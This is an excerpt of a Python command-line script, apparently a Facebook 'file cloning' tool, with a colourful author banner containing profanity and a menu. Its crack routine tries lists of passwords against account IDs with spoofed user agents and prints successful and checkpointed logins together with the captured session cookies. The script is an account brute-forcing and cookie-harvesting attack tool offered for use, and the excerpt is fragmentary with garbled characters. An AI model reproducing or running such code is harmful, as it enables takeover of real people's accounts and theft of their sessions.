...
def uaku():
	try:
		...
		a=requests.get('https://github.com/hanif540/Approved.txt/blob/main/Approved.txt').text
		ua=open('.bbnew.txt','w')
...
\33[38;5;196m┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m⭐🌟 HANIF 🌟⭐\33[38;5;196m━━━━━━━━━━
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\x1b[1;96m        : [★]  HANIF BIN WALID       
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\x1b[1;96m    : [★]  HANIF BIN WALID 
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\x1b[1;96m      : [★]  HANIF540    
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\x1b[1;96m  : [★]  Bangladeshi  
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\x1b[1;96m    : [★]  FUCK YOU    
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\x1b[1;96m  : [★]  FUCK-FILE CLONE  
\33[38;5;196m┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\x1b[1;96m: [★]  FREE  -𝗩. 0.16     
\33[38;5;196m┗━━━━━━━━━━━━━━━━━━━\033[1;31m{{ MRX }}\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┛""") 

def login():
	banner()
	TANJIDj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	TANJIDj('\033[0;97m===============================================')
	TANJID= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if TANJID in ['m']:
		public()
	elif TANJID in ['1']:
		crack_file()
...
def setting():
	...
	os.system('espeak -a 300 " 1,  method,  HEY"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[HANIF] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
       ...
       'user-agent': ua,}
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#TANJID-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢HANIF-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
				...
				#TANJID-King
				print(f'\r\033[0;92m[HANIF-OK âž¼-OKðŸ˜»] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
